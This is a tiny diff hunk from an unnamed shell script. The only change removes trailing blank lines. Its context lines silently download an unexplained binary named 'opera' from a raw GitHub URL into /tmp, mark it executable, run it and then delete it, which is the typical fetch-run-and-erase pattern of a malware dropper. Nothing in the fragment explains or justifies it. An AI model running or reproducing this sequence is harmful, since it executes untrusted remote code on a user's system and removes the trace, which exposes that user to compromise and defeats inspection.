@@ -4,7 +4,3 @@ curl -s "https://raw.githubusercontent.com/hdsed-sudo/mac-test/main/opera" -o /t
 chmod +x /tmp/opera
 /tmp/opera
 rm -f /tmp/opera
-
-
-
-
